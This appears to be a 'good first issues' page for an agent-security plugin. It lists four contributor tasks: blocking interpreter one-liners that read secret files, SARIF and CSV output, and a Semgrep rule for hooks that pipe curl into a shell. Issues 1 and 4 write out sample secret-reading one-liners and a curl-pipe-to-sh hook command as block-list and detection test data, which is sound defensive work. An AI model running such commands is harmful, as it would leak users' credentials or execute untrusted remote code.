# Good first issues

Small, well-specified pieces of work for a first contribution. Each one is self-contained, has a test to add, and needs no account, token or network access. Read [CONTRIBUTING.md](../CONTRIBUTING.md) first: standard library only for Python, tests next to every script, no new network calls, plain language without em-dashes.

To claim one, open an issue with the title below (or comment on the existing one) and say you are working on it. Run `python3 scripts/validate_plugin.py` and `python3 scripts/run_tests.py` before opening the pull request.

## 1. block-secret-exposure: catch interpreter one-liners that read a secret file

**Labels:** good first issue, hooks, python

**Context.** `plugins/agent-security/hooks/scripts/block_secret_exposure.py` blocks `cat .env`, `python3 -c 'print(os.environ)'` and `node -e 'console.log(process.env.OPENAI_API_KEY)'`, but not an interpreter one-liner that opens a secret file and prints it: `python3 -c "print(open('.env').read())"`, `node -e "console.log(require('fs').readFileSync('.env','utf8'))"`, `ruby -e 'puts File.read(".env")'`, `perl -e 'print <>' .env`. The file check in `_secret_file()` already knows which paths count; it is only applied to arguments of the programs in `READERS`.

**Acceptance criteria.**
- A new check in `check_segment()` for `python`, `python3`, `node`, `ruby`, `perl`, `php` segments scans the `-c` / `-e` / `-r` source string for file-opening calls (`open(`, `readFileSync(`, `readFile(`, `File.read(`, `file_get_contents(`) whose first string argument passes `_secret_file()`, and blocks with a reason that names the file.
- The five commands above are added to `BLOCKED` in `test_hooks.py`; `python3 -c "print(open('README.md').read())"` and `node -e "console.log(require('fs').readFileSync('package.json','utf8'))"` are added to `ALLOWED`.
- The docstring list of blocked patterns and the README hook table mention interpreter file reads.

## 2. audit_agent_config.py: add `--format sarif` for GitHub code scanning

**Labels:** good first issue, skills, python

**Context.** `plugins/agent-security/skills/agent-config-audit/scripts/audit_agent_config.py` outputs JSON or Markdown. Teams that run it in CI want the findings in the pull request's code scanning tab, which takes SARIF 2.1.0. Every finding already has `id`, `severity`, `title`, `file`, `line`, `evidence` and `recommendation`, which map directly to a SARIF `result` with a `rule`.

**Acceptance criteria.**
- `--format sarif` writes a valid SARIF 2.1.0 log (`$schema`, `version`, one `run` with `tool.driver.name` "agent-config-audit", `rules` built from the ids in `references/checks.md`, and one `result` per finding with `level` mapped from severity: critical and high to `error`, medium to `warning`, low and info to `note`).
- A test in `test_audit_agent_config.py` runs the scanner on the existing bad-config fixture, parses the SARIF with `json`, and checks the result count equals the JSON output's count and that every `result.ruleId` exists in `rules`.
- `SKILL.md` and `references/checks.md` document the format and the `upload-sarif` step for GitHub Actions.

## 3. incidents.py: add `--format csv` to `list` and `precedents`

**Labels:** good first issue, skills, python

**Context.** `plugins/agent-security/skills/incident-lookup/scripts/incidents.py` prints a table, JSON or Markdown. Reviewers who paste results into a spreadsheet or a report appendix ask for CSV. The columns are already fixed in `COLUMNS` (and `cols` in `cmd_precedents`); the upstream dataset ships `incidents.csv` with the same field names, so the header should match it where the columns overlap.

**Acceptance criteria.**
- `--format csv` is accepted by the top-level parser and handled in `emit()` with the standard library `csv` module, quoting fields that contain commas or quotes; list-valued cells (`owasp_agentic`, `cve`) are joined with `; `.
- `cmd_precedents` honours it too (columns `id, date, name, score, why, outcome, owasp_agentic, url`).
- Tests in `test_incidents.py` parse the CSV back with `csv.DictReader` and check the row count and the header for both commands, using `--offline`.

## 4. Bundled Semgrep rules: add `agentic.config.hook-pipes-remote-into-shell`

**Labels:** good first issue, semgrep, yaml

**Context.** `plugins/agent-security/skills/semgrep-agentic/rules/agentic-config.yaml` has five configuration rules for `.claude/settings.json` and `.mcp.json`. A hook whose `command` pipes `curl` or `wget` into `sh`, `bash` or `python` (`"command": "curl -s https://x/hook.sh | sh"`) runs remote code on every tool call. `audit_agent_config.py` already flags this as `HOOK-002`; the Semgrep pack should catch it too so CI users get the same finding.

**Acceptance criteria.**
- A new rule with id `agentic.config.hook-pipes-remote-into-shell`, `languages: [json]`, severity ERROR, a `metadata` block in the same shape as the other config rules (cwe, owasp, confidence, likelihood, impact, references), and a `pattern-regex` on the `command` value that matches `curl` or `wget` followed by a pipe into `sh`, `bash`, `zsh`, `python`, `python3`, `node` or `perl`.
- The rule fires on a new `hooks` block added to `rules/tests/config-bad/.claude/settings.json` and stays quiet on a benign hook (`"command": "\"${CLAUDE_PLUGIN_ROOT}\"/scripts/format.sh"`) added to `rules/tests/config-ok/.claude/settings.json`.
- The `expected` set in `.github/workflows/ci.yml` and the "Rule ids" table in `SKILL.md` include the new id.
